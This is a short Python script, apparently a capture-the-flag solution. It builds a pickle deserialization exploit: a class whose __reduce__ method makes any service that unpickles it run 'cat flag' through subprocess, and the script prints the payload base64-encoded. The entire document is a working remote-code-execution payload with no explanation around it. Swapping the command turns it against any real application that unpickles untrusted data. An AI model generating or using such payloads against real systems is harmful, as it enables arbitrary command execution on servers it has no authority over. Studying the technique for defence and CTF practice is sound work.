import pickle
import base64
from subprocess import check_output

class PickleRce(object):
    def __reduce__(self):

        return (check_output, (["cat", "flag"], ))

print(base64.b64encode(pickle.dumps(PickleRce())))
